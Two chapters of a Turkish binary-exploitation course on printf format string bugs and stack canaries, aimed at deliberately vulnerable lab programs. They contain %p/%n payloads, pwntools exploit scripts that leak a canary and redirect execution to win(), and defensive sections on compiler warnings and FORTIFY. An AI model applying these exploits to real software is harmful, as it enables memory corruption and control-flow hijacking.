# Bölüm 16: Format string: printf ile okumak ve yazmak

## Bu bölümde

Şimdiye kadar tek bir hata türüyle uğraştık: buffer taşması. Bu bölümde bambaşka bir hata göreceğiz. Görünüşü masum: `printf(buf)`. Bir karakter eksik, bir `"%s", ` eksik. Ama bu eksiklik saldırgana hem belleği **okuma** hem de belleğe **yazma** imkânı veriyor. Sonraki üç bölümde korumaları aşmak için kullanacağımız bütün sızıntıların kaynağı bu hata.

**Ön koşullar:** Bölüm 4 (çağırma düzeni, `rsi`…`r9`), Bölüm 5 (`[rsp+X]`), Bölüm 13 (sızıntı kavramı).

**Bu bölümün sonunda:**

- `printf(buf)` hatasının neden `printf`'in yazmaçlardan ve yığından "olmayan argümanlar" okumasına yol açtığını açıklayabileceksin.
- `%p` dökümünde kendi girdinin hangi yuvada göründüğünü bulup `%N$p` = `[rsp + (N−6)·8]` kuralını uygulayabileceksin.
- `%n` ile bir global değişkene istediğin değeri yazan bir payload kurabileceksin.
- Bu hatayı derleyicinin ve FORTIFY'ın nasıl yakaladığını gösterebileceksin.

## Sezgi: boş formu imzalatmak

Bir memura, üstünde "______ TL'yi ______ hesabına aktarın" yazan bir form verdiğini düşün. Memur boşlukları senin verdiğin bilgilerle doldurur. Şimdi formu sen yazıyorsun ve içine "yanındaki dosyadaki ilk beş numarayı yüksek sesle oku" diye bir satır ekliyorsun. Memur formu harfiyen uyguladığı için, sana hiç verilmemesi gereken numaraları okur.

`printf` o memur. İlk argümanı bir form (biçim metni). İçindeki her `%` "bir sonraki argümanı al ve şöyle yaz" demek. Formu kullanıcı yazabiliyorsa, `printf`'in hangi "argümanları" okuyacağına da kullanıcı karar verir. Ama `printf`'e aslında hiç argüman verilmedi. Argümanların olması gereken yerlerden okur: önce yazmaçlardan, sonra yığından.

Benzetmenin bozulduğu yer: memurun elinde sadece okuma yetkisi var. `printf`'in ise bir de yazma yetkisi var: `%n`.

## Biçim belirteçleri

```c
printf(buf);          /* YANLIŞ */
printf("%s", buf);    /* DOĞRU  */
```

| Biçim | Ne yapar |
|---|---|
| `%d` | Sonraki argümanı onluk sayı olarak yaz. |
| `%x` | Onaltılık yaz (4 bayt). |
| `%p` | İşaretçi olarak yaz (8 bayt, `0x` ile, sıfırsa `(nil)`). |
| `%s` | Sonraki argümanı bir **adres** say ve oradaki metni yaz. |
| `%n` | Şimdiye kadar yazılan karakter sayısını, sonraki argümanın **gösterdiği adrese yaz**. |
| `%7$p` | 7. argümanı `%p` ile yaz. Sırayla gitmeden doğrudan seçme. |
| `%100c` | Bir karakteri 100 karakter genişliğinde yaz (99 boşluk + karakter). |

## Hedef

```c
/* e06_fmt: format string hatasi. Okuma (%p) ve yazma (%n). */
#include <stdio.h>
#include <unistd.h>

unsigned int hedef = 0;

int main(void)
{
    char buf[128];
    setvbuf(stdout, NULL, _IONBF, 0);
    for (int i = 0; i < 2; i++) {
        printf("mesaj: ");
        int n = read(0, buf, sizeof(buf) - 1);
        if (n <= 0)
            return 1;
        buf[n] = 0;
        printf(buf);          /* HATA: kullanici girdisi format olarak */
        printf("\nhedef = %u\n", hedef);
    }
    if (hedef == 1337)
        puts("tebrikler: hedef degisti!");
    return 0;
}
```

Bu programda taşma yok: `read` `sizeof(buf) - 1` kadar okuyor. Tek hata `printf(buf)`. Amacımız, `hedef` adlı global değişkeni 1337 yapmak. PIE kapalı, yani adresi sabit:

```bash
nm ~/cracks/e06_fmt | grep hedef
```

```text
000000000040403c B hedef
```

`B`: sıfırla başlayan global değişkenlerin bölümü (`.bss`).

```bash
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -Wno-format-security \
    -o ~/cracks/e06_fmt ~/.cracks_src/e06_fmt.c
```

`-Wno-format-security` derleyicinin bu hatayı yakalayan uyarısını susturuyor. Gerçek hayatta bu uyarının varlık sebebi tam olarak bu hata. Savunma kısmında bu uyarıyı geri açacağız.

## Okumak: yığını dökmek

```bash
printf '%%x %%d %%p\n' | ~/cracks/e06_fmt | head -1
```

```text
mesaj: 164a9aa0 9 0x73edf2be1a0d
```

(Kabuktaki `printf` komutunda `%` yazmak için `%%` yazıyoruz. Programa giden metin `%x %d %p`.)

Hiçbir sayı vermedik ama `printf` üç sayı yazdı. Bunlar `printf` çağrıldığı anda `rsi`, `rdx`, `rcx` yazmaçlarında duran değerler. `printf` onları argüman sandı.

Daha fazlasını dökelim. Başına tanıyabileceğimiz bir işaret koyalım:

```bash
printf 'AAAAAAAA.%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p\n' | ~/cracks/e06_fmt | head -1
```

```text
mesaj: AAAAAAAA.0x7ffc64bae580.0x24.0x7b7663e6ba0d.(nil).(nil).0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025
```

| Sıra | Değer | Nereden |
|---|---|---|
| 1 | `0x7ffc64bae580` | `rsi` (bir yığın adresi) |
| 2 | `0x24` | `rdx` |
| 3 | `0x7b7663e6ba0d` | `rcx` (bir libc adresi!) |
| 4 | `(nil)` | `r8` |
| 5 | `(nil)` | `r9` |
| **6** | **`0x4141414141414141`** | **yığın: buffer'ın ilk 8 baytı = `AAAAAAAA`** |
| 7 | `0x252e70252e70252e` | buffer'ın sonraki 8 baytı: `.%p.%p.%` (little-endian) |

Bölüm 4'teki kuralın doğrudan sonucu: biçim metni `rdi`'de, sonraki beş argüman `rsi`, `rdx`, `rcx`, `r8`, `r9`'da, ondan sonrakiler yığında.

> [!NOTE]
> **Kural:** x86-64 Linux'ta `%1$p`–`%5$p` yazmaçları, `%6$p` ve sonrası yığını okur. **`%N$p` = `[rsp + (N−6)·8]`**, burada `rsp` `printf`'in çağrıldığı andaki değer.

Bu programda buffer yığının tepesinde başladığı için `%6$p` kendi girdimizin ilk 8 baytını gösterdi. Bu bilgi bir sonraki adımın anahtarı: **girdimizin kendisi, `printf`'in argümanlarından biri olarak okunabiliyor.** Girdiye bir adres koyarsak, `printf` o adresi bir argüman olarak kullanır.

Doğrudan seçme:

```bash
printf 'AAAAAAAA%%6$p\n' | ~/cracks/e06_fmt | head -1
```

```text
mesaj: AAAAAAAA0x4141414141414141
```

## Okumanın tehlikesi: %s

`%p` sadece sayıyı yazar. `%s` ise sayıyı adres sayıp o adrese gider:

```bash
printf '%%s%%s%%s%%s%%s%%s%%s%%s' | ~/cracks/e06_fmt; echo " rc=$?"
```

```text
mesaj:  rc=139
```

Argümanlardan biri geçersiz bir adresti ve program SIGSEGV ile öldü. Bir programda format string hatası olup olmadığını anlamanın en hızlı yolu bu, ama sızıntı için her zaman `%p` kullan.

## Yazmak: %n

`%n` hiçbir şey yazdırmaz. O ana kadar ekrana yazılmış karakter sayısını, sıradaki argümanın **gösterdiği adrese** yazar. Meşru kullanımı o kadar nadir ki bazı C kütüphaneleri (örneğin Windows'un) onu varsayılan olarak kapatır.

Plan:

1. Payload'ın içine `hedef`'in adresini koy.
2. Bu adres buffer'da, yani yığında durur, yani `printf`'in N. argümanı olarak görünür.
3. Tam 1337 karakter yazdır.
4. `%N$n` ile "N. argümanın gösterdiği adrese 1337 yaz" de.

### Yerleşim

Adresin içinde null baytlar var: `0x000000000040403c`. `printf` biçim metnini ilk null baytta bitirir. Adres metnin başında olsaydı, `printf` daha `%` işaretlerine gelmeden dururdu. O yüzden **biçim parçaları önce, adres en sonda**:

```text
buf+0   buf+8   buf+16
┌───────┬───────┬──────────────────┐
│%1337c%│8$nXXXX│ 3c 40 40 00 ...  │
└───────┴───────┴──────────────────┘
 %6$p    %7$p    %8$p  ← hedef'in adresi burada
```

- `%1337c%8$n` 10 bayt. 8'in katına (16'ya) tamamlamak için 6 tane `X`.
- Adres 16. bayttan başlıyor: 6 + 16/8 = **8. argüman**.
- `%1337c` 1337 karakter yazdırır.
- `%8$n` bu sayıyı 8. argümanın gösterdiği yere, yani `hedef`'e yazar.

Bu dosya `~/.cracks_src/e06_fmt_x.py` olarak duruyor:

```python
from pwn import *
p = process("/home/linkola/cracks/e06_fmt")
hedef = 0x40403c                        # nm e06_fmt | grep hedef
payload = b"%1337c%8$n".ljust(16, b"X") + p64(hedef)
p.sendafter(b"mesaj: ", payload)
p.sendafter(b"mesaj: ", b"bitti")
print(p.recvall().decode().split("\n")[-3:])
```

## Deneme sürüşü

```text
['hedef = 1337', 'tebrikler: hedef degisti!', '']
```

Elle çalıştırınca çıktı şöyle görünüyor (1336 boşluğu kısalttık):

```text
mesaj:                                       ...  XXXXXX<@@
hedef = 1337
mesaj: bitti
hedef = 1337
tebrikler: hedef degisti!
```

`hedef` değişti. Programın hiçbir yerinde `hedef`'e değer atayan bir satır yok. Sadece bir `printf` çağrısıyla belleğe yazdık. Satırın sonundaki `<@@`, adresin baytlarının harf karşılığı: `0x3c` = `<`, `0x40` = `@`. `printf` ilk null bayta kadar yazdırdı.

### Büyük sayılar yazmak

1337 küçük. Bir adres yazmak isteseydik (`0x7f...` gibi), trilyonlarca karakter yazdırmamız gerekirdi. Çözüm sayıyı parçalara bölmek:

| Biçim | Kaç bayt yazar |
|---|---|
| `%n` | 4 |
| `%hn` | 2 |
| `%hhn` | 1 |
| `%ln` | 8 |

Bir adresi 2'şer baytlık parçalarla `%hn` kullanarak, birden çok hedef adres ve dikkatle sıralanmış genişliklerle tek seferde yazarsın. Elle hesaplaması sıkıcı. pwntools senin yerine yapar:

```python
payload = fmtstr_payload(6, {0x40403c: 1337})   # 6 = girdinin başladığı yuva
```

Ama önce tek bir `%n`'i elle yaz ve mantığını oturt.

## Savunma tarafı

Format string hatası, yakalanması en kolay hatalardan biri. Bu makinede üç savunmayı denedik.

**1. Kaynak kodda düzelt.** `printf("%s", buf)` ya da `fputs(buf, stdout)`. Bitti.

**2. Derleyici uyarısı.** gcc bu hatayı `-Wformat-security` ile yakalar. `-Werror=format-security` ile hataya çevirirsen program derlenmez:

```bash
gcc -O0 -Wformat -Werror=format-security -o e06_w e06_fmt.c
```

```text
e06_fmt.c:17:16: error: format not a string literal and no format arguments [-Werror=format-security]
   17 |         printf(buf);          /* HATA: kullanici girdisi format olarak */
      |                ^~~
```

Birçok dağıtım paketlerini bu seçenekle derler.

**3. FORTIFY_SOURCE.** `-O2 -D_FORTIFY_SOURCE=2` ile derlenen programda `printf`, `__printf_chk` ile değişir. Bu sürüm bazı tehlikeli kullanımları çalışma anında yakalar. Aynı payload'ı gönderdik:

```text
mesaj: *** invalid %N$ use detected ***
```

Program çıkış kodu 134 ile kendini öldürdü. Ama dikkat: aynı programa `%p.%p.%p` gönderince hâlâ şunu yazıyor:

```text
mesaj: 0x9.0x7e7c98c40a0d.(nil)
```

FORTIFY yazmayı ve konumsal argümanları zorlaştırıyor, ama **sızıntıyı engellemiyor**. İkinci değer bir libc adresi. Gerçek savunma birinci madde.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Adresi biçim metninin başına koymak.** İlk null baytta `printf` durur, `%n`'e hiç ulaşmaz.
> - **Yuva hesabında 6'yı unutmak.** İlk beş argüman yazmaçlarda.
> - **Dolguyu 8'in katına tamamlamamak.** Adres bir yuvanın ortasına düşer.
> - **Sızıntı için `%s` kullanmak.** Geçersiz adreste program çöker. `%p` kullan.
> - **`%n`'in 4 bayt yazdığını unutmak.** `hedef`'in yanındaki değişkenler etkilenmez, ama 1 baytlık bir hedefe `%n` yazarsan komşusunu bozarsın: `%hhn`.

## Kontrol soruları

1. `printf(buf)` çağrısında `%p` ilk olarak hangi yazmacı okur?
2. `%6$p` neden kendi girdimizin ilk 8 baytını gösterdi?
3. `printf` çağrıldığında `rsp` = `rbp − 0x60` ve bir değer `rbp − 0x8`'de ise, o değer hangi yuvada?
4. Payload'da adresin biçim parçalarından sonra gelmesi neden şart?
5. `%1337c%8$n` neden tam 1337 yazar?
6. FORTIFY açıkken sızıntı hâlâ mümkün mü?

## Alıştırmalar

1. **Gözlemle.** `%1$p`'den `%12$p`'ye kadar dökün ve her yuvanın ne olduğunu (yazmaç, kendi girdin, yığın adresi, libc adresi) bir tabloya yaz.
2. **Tahmin et, sonra dene.** `hedef`'i 42 yapmak için payload'ı hesapla. Dolgu kaç `X` olmalı? Adres hangi yuvada olur? Önce yaz, sonra dene.
3. **Kendin yap.** `%3$p`'deki libc adresinden libc tabanını hesapla (gdb'de `info symbol` ile hangi fonksiyonun içinde olduğunu bul). Taban `000` ile bitmeli.
4. **Kendin yap.** `fmtstr_payload(6, {0x40403c: 0x1337})` çıktısını `xxd` ile incele. İçinde `%hhn` ya da `%hn` var mı?

## Özet

- `printf(girdi)`: girdi biçim metni olur, `printf` "olmayan argümanları" yazmaçlardan ve yığından okur.
- `%N$p` = `[rsp + (N−6)·8]`. Kendi girdin de bir yuvada görünür.
- `%p` okur, `%s` adres sanıp gider (çökebilir), `%n` yazar.
- `%n` payload'ı: biçim parçaları önce, hedef adres sonda, dolguyla 8'e hizalı.
- Savunma: `printf("%s", buf)`, `-Werror=format-security`, FORTIFY (sızıntıyı engellemez).

Bu bölümde basit bir değişkeni değiştirdik. Asıl güç ise okuma tarafında: bir sonraki bölümde bu yetenekle, dönüş adresinin önündeki bekçiyi okuyacağız.

---
**Kontrol sorularının cevapları**

1. `rsi`.
2. Buffer yığının tepesinde başlıyor: `printf` çağrıldığında `[rsp]` buffer'ın ilk 8 baytı.
3. `rbp − 0x8` = `rsp + 0x58`. 6 + 0x58/8 = 6 + 11 = 17. yuva.
4. Adres null baytlar içeriyor. `printf` biçim metnini ilk null bayta kadar okur.
5. `%1337c` 1337 karakter genişliğinde bir karakter basar. `%n` o ana kadar basılan karakter sayısını yazar.
6. Evet. FORTIFY konumsal argümanların tehlikeli kullanımını ve yazılabilir biçim metninde `%n`'i yakalar, `%p` sızıntısını engellemez.

**Bu bölümde geçen yeni terimler:** biçim metni (format string), biçim belirteci, `%n`, konumsal argüman (`%N$`), `fmtstr_payload`, `-Wformat-security`.


# Bölüm 17: Stack canary: yığın bekçisi

## Bu bölümde

Şimdiye kadar dönüş adresine istediğimiz gibi yazdık. Derleyiciler buna karşı basit ama etkili bir önlem alır: dönüş adresinin hemen önüne rastgele bir sayı koyarlar ve fonksiyon dönmeden önce o sayının değişip değişmediğine bakarlar. Bu bölümde bu bekçiyi önce iş başında göreceğiz, sonra bir önceki bölümdeki format string sızıntısıyla değerini okuyup, onu bozmadan yanından geçeceğiz.

**Ön koşullar:** Bölüm 10 (ret2win), Bölüm 16 (`%N$p` yuva hesabı).

**Bu bölümün sonunda:**

- Canary'nin yığındaki yerini ve kontrolünü assembly'de tanıyabileceksin.
- Canary'nin neden her zaman `00` ile bittiğini açıklayabileceksin.
- Bir sızıntı dökümünde canary'yi üç özelliğinden tanıyabileceksin.
- Canary'yi sızdırıp aynısını geri yazan bir exploit kurabileceksin.
- Canary'nin neleri korumadığını sayabileceksin.

## Sezgi: kapıya sıkıştırılmış kâğıt

Eski casus filmlerindeki hileyi hatırla: odadan çıkarken kapının aralığına küçük bir kâğıt sıkıştırılır. Dönünce kâğıt yere düşmüşse, birinin kapıyı açtığı anlaşılır. Canary o kâğıt. Fonksiyon başlarken dönüş adresinin önüne koyulur, dönerken yerinde mi diye bakılır.

Benzetmenin bozulduğu yer: casus kâğıdın nasıl sıkıştırıldığını görürse, odadan çıkarken aynen geri koyabilir. Canary de öyle. Değerini bir şekilde okuyabilirsek, taşma sırasında aynı değeri geri yazarız ve bekçi hiçbir şey fark etmez.

## Nasıl çalışır

Program başlarken rastgele 8 baytlık bir sayı seçilir. Adını, madencilerin zehirli gazı erken fark etmek için madene götürdükleri kanaryalardan alır. Canary ile korunan her fonksiyon:

1. **Girişte** canary'yi yerel değişkenlerle dönüş adresinin arasına koyar.
2. **Çıkışta**, `ret`'ten önce yığındaki canary'nin hâlâ aynı olup olmadığına bakar. Değişmişse `__stack_chk_fail`'i çağırır ve program hemen kapanır.

```text
          ┌──────────────────────┐
          │ buf[64]              │ rbp-0x50
          │ ...                  │
          ├──────────────────────┤
          │ CANARY (8 bayt)      │ rbp-0x08   ← taşma önce bunu ezer
          ├──────────────────────┤
          │ kaydedilmiş rbp      │ rbp
          ├──────────────────────┤
          │ dönüş adresi         │ rbp+0x08
          └──────────────────────┘
```

Buffer'dan dönüş adresine giden her taşma önce canary'nin üstüne yazmak **zorunda**. Değerini bilmiyorsan doğru değeri yazamazsın.

## Assembly'de

`e07_canary`'nin `vuln`'ü `-fstack-protector-all` ile derlendi:

```nasm
4011a6:  push   rbp
4011a7:  mov    rbp,rsp
4011aa:  sub    rsp,0x60
4011ae:  mov    rax,QWORD PTR fs:0x28      ; canary'yi al
4011b7:  mov    QWORD PTR [rbp-0x8],rax    ; yığına koy
4011bb:  xor    eax,eax                    ; rax'ten sil
         ...
40124e:  mov    rax,QWORD PTR [rbp-0x8]    ; yığındakini al
401252:  sub    rax,QWORD PTR fs:0x28      ; asıl değerden çıkar
40125b:  je     401262 <vuln+0xbc>         ; fark 0 ise devam
40125d:  call   401050 <__stack_chk_fail@plt>   ; değilse: öl
401262:  leave
401263:  ret
```

- **`fs:0x28`**: canary'nin asıl değeri, her iş parçacığına özel bir bellek alanında (TLS) saklanır. `fs` yazmacı bu alanı gösterir. Bu kopyayı taşmayla değiştiremezsin, çünkü yığında değil.
- **`xor eax,eax`**: canary yığına konduktan sonra `rax`'ten silinir ki başka bir yere sızmasın.
- Çıkışta yığındaki değer asıl değerden çıkarılır. Fark 0 değilse program ölür.

Bu kalıbı bir kere tanıyınca her yerde görürsün. Binary Ninja'da bir fonksiyonun sonunda `__stack_chk_fail` görüyorsan o fonksiyonda canary var.

| gcc seçeneği | Hangi fonksiyonlar korunur |
|---|---|
| `-fno-stack-protector` | hiçbiri |
| `-fstack-protector` | sadece büyük `char` dizileri olanlar |
| `-fstack-protector-strong` | her türlü yerel dizisi ya da adresi alınan yerel değişkeni olanlar (çoğu dağıtımda varsayılan) |
| `-fstack-protector-all` | hepsi |

## Hedef

```c
/* e07_canary: kanarya acik. Once sizdir, sonra tas. NX acik, PIE yok. */
void win(void)
{
    puts("tebrikler: kanaryayi gectin, win() calisti!");
    _exit(0);
}

void vuln(void)
{
    char buf[64];
    printf("isim: ");
    int n = read(0, buf, 63);
    buf[n > 0 ? n : 0] = 0;
    printf("merhaba ");
    printf(buf);              /* HATA 1: format string */
    printf("\nmesaj: ");
    read(0, buf, 200);        /* HATA 2: taşma */
}
```

İki girdi, iki hata. Birincisi format string, ikincisi taşma. Gerçek hayatta tek bir programda iki hata bulmak sık rastlanan bir şey değil, ama CTF'lerde bu tam olarak "bir hatayla sızdır, diğeriyle saldır" kalıbını öğretmek için kullanılır.

## Önce bekçiyi tetikle

Sadece taşmayı deneyelim:

```bash
(printf 'ali'; sleep 0.2; python3 -c 'import sys; sys.stdout.buffer.write(b"A"*100)') | ~/cracks/e07_canary; echo " exit=$?"
```

```text
isim: merhaba ali
mesaj: *** stack smashing detected ***: terminated
 exit=134
```

Canary bozuldu ve program kendini öldürdü. Çıkış kodu 134 = SIGABRT. Dönüş adresini ezmiş olsak bile `ret` hiç çalışmadı.

## Canary'yi tanımak

Bölüm 16'daki yöntemle yığını dökelim. `%15$p`'den `%19$p`'ye beş yuva, iki çalıştırma:

```bash
(printf '%%15$p %%16$p %%17$p %%18$p %%19$p'; sleep 0.2; printf 'x') | ~/cracks/e07_canary
```

```text
isim: merhaba 0x7ffe46a9ad70 (nil) 0xf219b17e68763700 0x7ffe46a9ad70 0x40129e
mesaj: normal cikis.

isim: merhaba 0x7ffd774b0660 (nil) 0x94e35fc04ae16000 0x7ffd774b0660 0x40129e
mesaj: normal cikis.
```

`%17$p`'ye bak: `0xf219b17e68763700` ve `0x94e35fc04ae16000`.

1. **Her çalıştırmada farklı.** Rastgele.
2. **Hep `00` ile bitiyor.** En düşük bayt bilerek sıfır yapılır. Bellekte en düşük adreste duran bayt bu (little-endian). `puts`, `printf("%s")`, `strcpy` gibi metin fonksiyonları null bayta gelince durur. Böylece buffer'ın sonuna yapışık bir metin sızıntısı canary'yi okuyamaz, bir metin kopyalama da onu yazamaz.
3. **Mahallesi yok.** `0x7ff...` (yığın) ya da `0x40...` (kod) ile başlamıyor.

Bu üç özellik, onu bir dökümde bulmanı sağlar: **rastgele görünen, `00` ile biten 8 bayt.**

### Yuvayı hesapla

Tahmine gerek yok. `printf` çağrıldığında `rsp` = `rbp−0x60`. `%N$p` = `[rsp + (N−6)·8]`:

| Ne | Adres | Hesap | Yuva |
|---|---|---|---|
| buf | `rbp−0x50` = `rsp+0x10` | 6 + 0x10/8 | `%8$p` |
| canary | `rbp−0x08` = `rsp+0x58` | 6 + 0x58/8 | **`%17$p`** |
| kaydedilmiş rbp | `rbp` = `rsp+0x60` | 6 + 0x60/8 | `%18$p` |
| dönüş adresi | `rbp+0x08` = `rsp+0x68` | 6 + 0x68/8 | `%19$p` |

Döküm doğruluyor: `%19$p` = `0x40129e`. `main`'e bakalım:

```nasm
401299:  call   4011a6 <vuln>
40129e:  lea    rax,[rip+0xda8]
```

`0x40129e`, `call vuln`'den sonraki komut, yani `vuln`'ün dönüş adresi. `%18$p` de bir yığın adresi, kaydedilmiş rbp. Hesap tuttu.

## Canary'yi geçmek

Plan:

1. **1. girdi:** `%17$p` ile canary'yi sızdır.
2. **2. girdi:** taş, ama canary'nin yerine **sızdırdığın değerin aynısını** yaz.

```text
buf (rbp-0x50)                       canary (rbp-0x8)  rbp       dönüş adresi
┌────────────────────────────────────┬─────────────────┬─────────┬─────────┐
│ A * 72                             │ sızan canary    │ B * 8   │ win     │
└────────────────────────────────────┴─────────────────┴─────────┴─────────┘
0                                    72                80        88
```

Mesafe: `0x50 − 0x08 = 0x48 = 72`.

Bu dosya `~/.cracks_src/e07_canary_x.py` olarak duruyor:

```python
from pwn import *
context.log_level = "error"
e = ELF("/home/linkola/cracks/e07_canary", checksec=False)
p = process(e.path)

# 1. adım: format string ile canary'yi sızdır (%17$p)
p.sendafter(b"isim: ", b"%17$p")
p.recvuntil(b"merhaba ")
canary = int(p.recvline(), 16)
print("kanarya =", hex(canary))

# 2. adım: taş, canary'yi olduğu gibi geri yaz, dönüş adresini win() yap
payload  = b"A" * 72          # buf (rbp-0x50) -> canary (rbp-0x8)
payload += p64(canary)        # canary: aynı değer
payload += b"B" * 8           # kaydedilmiş rbp
payload += p64(e.sym.win)     # dönüş adresi
p.sendafter(b"mesaj: ", payload)
print(p.recvall(timeout=2))
```

## Deneme sürüşü

```text
kanarya = 0x101add35ba9e4200
b'tebrikler: kanaryayi gectin, win() calisti!\n'
kanarya = 0x41f9f1ddc18fe800
b'tebrikler: kanaryayi gectin, win() calisti!\n'
```

Canary her seferinde farklı, exploit her seferinde çalışıyor. Çünkü değeri tahmin etmiyoruz, **o anki değeri okuyoruz.** Bekçi `ret`'ten önce baktığında kâğıdı yerinde buluyor.

## Canary neyi korumaz

Canary yalnızca **dönüş adresini**, ve sadece **fonksiyon dönerken** korur. Bu kadar. Şunları korumaz:

- **Canary'nin önündeki yerel değişkenler.** Bölüm 7'deki `admin` gibi, buffer ile canary arasındaki her değişken hâlâ ezilebilir. Program o değişkeni fonksiyon dönmeden önce kullanıyorsa, canary daha kontrol edilmeden işin biter.
- **Fonksiyon dönmeden yapılan şeyler.** Taşma bir işaretçiyi ezerse ve program o işaretçiyi `ret`'ten önce kullanırsa, canary işe yaramaz.
- **Sızıntı varsa hiçbir şey.** Az önce gördün.
- **Kaba kuvvet.** Her bağlantı için `fork` yapan sunucularda çocuk süreçlerin canary'si ebeveyninkiyle aynıdır. Canary'yi bayt bayt deneyerek bulmak mümkün olur: en fazla 7 × 256 deneme (en düşük bayt zaten `00`).

> [!TIP]
> **Merdiven:** `p01_gate` canary ile derlendi ve buna rağmen kırılabiliyor. Bu listenin ilk maddesi nedenini açıklıyor.

## Savunma tarafı

Canary'nin kendisi bir savunma. Onu daha etkili kılan şeyler:

- **Sızıntıyı kapatmak.** Bu programda canary'yi delen şey format string hatası. Bölüm 16'daki düzeltmeler (`printf("%s", buf)`) canary'yi tekrar etkili kılar.
- **Değişken sıralaması.** gcc, `-fstack-protector-strong` ile diziyi canary'ye en yakın yere, diğer yerel değişkenleri dizinin altına yerleştirmeye çalışır. Böylece diziden taşan veri önce canary'ye çarpar, diğer değişkenlere değil. `struct` içindeki alanlarda bunu yapamaz, `p01_gate`'in açığı da buradan geliyor.
- **Gölge yığın:** canary sızsa bile `ret` dönüş adresini korumalı kopyayla karşılaştırır.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Canary'den sonra kaydedilmiş rbp'yi unutmak.** Canary → 8 bayt rbp → dönüş adresi.
> - **Canary'yi `p32` ile yazmak.** 8 bayt.
> - **Yanlış yuvayı sızdırmak.** Yuvayı hesapla ve `00` ile bittiğini kontrol et.
> - **Sızıntıyla saldırıyı farklı çalıştırmalarda yapmak.** Canary her çalıştırmada değişir.

## Kontrol soruları

1. Canary'nin asıl değeri nerede saklanır, neden taşmayla değiştirilemez?
2. Canary neden `00` ile biter?
3. Bir dökümde canary'yi hangi üç özellikten tanırsın?
4. `rsp = rbp − 0x60` iken `[rbp + 8]` hangi yuva?
5. Canary'li bir programda yan değişkeni ezmek neden hâlâ mümkün?
6. `fork` yapan bir sunucuda canary neden kaba kuvvete açık?

## Alıştırmalar

1. **Gözlemle.** Payload'daki canary'nin son baytını `00` yerine `01` yapıp gönder. Ne olur?
2. **Tahmin et, sonra dene.** Payload'da canary doğru ama kaydedilmiş rbp yerine 8 bayt yerine 4 bayt `B` koyarsan ne olur? Önce tahmin et.
3. **Kendin yap.** Exploit'i, `%17$p`'yi elle yazmadan çalışacak şekilde değiştir: `%10$p`–`%25$p` dökümü al, `00` ile biten ve `0x7f`/`0x40` ile başlamayan ilk değeri canary kabul et.
4. **Kendin yap.** `e07_canary`'yi Binary Ninja'da aç. `vuln`'ün HLIL görünümünde canary kontrolü nasıl görünüyor?

## Özet

- Canary: girişte `fs:0x28`'den alınıp `[rbp−8]`'e konan, çıkışta kontrol edilen rastgele değer.
- Bozulursa `*** stack smashing detected ***`, çıkış kodu 134.
- Hep `00` ile biter, rastgeledir, adres mahallesine benzemez.
- Sızdır (`%17$p`) → aynısını geri yaz → `ret` serbest.
- Canary yan değişkenleri, dönmeden önce kullanılan işaretçileri ve sızıntıyı korumaz.

Bu programda `win`'in adresi hâlâ sabitti. Bir sonraki bölümde onu da elimizden alacağız: PIE.

---
**Kontrol sorularının cevapları**

1. TLS'de, `fs:0x28`'de. Yığında değil, taşma oraya ulaşamaz.
2. Metin fonksiyonları null baytta durduğu için canary'nin bir metin sızıntısıyla okunmasını ya da metin kopyalamayla yazılmasını engellemek için.
3. Rastgele, `00` ile biter, bir adres mahallesine benzemez.
4. `rsp + 0x68` → 6 + 13 = 19.
5. Canary sadece dönüş adresinin önünde ve sadece fonksiyon dönerken kontrol edilir. Yan değişken ondan önce okunur.
6. `fork` ile oluşturulan çocuk süreç ebeveynin belleğinin kopyasıdır, canary dahil. Çocuk çökse bile bir sonraki bağlantı aynı canary ile gelir.

**Bu bölümde geçen yeni terimler:** canary, `__stack_chk_fail`, TLS, `fs:0x28`, `-fstack-protector-strong`, SIGABRT.

---

[← 08-got-plt-ret2libc](08-got-plt-ret2libc.md) · [İçindekiler](README.md) · [10-pie-ve-hepsi-bir-arada →](10-pie-ve-hepsi-bir-arada.md)
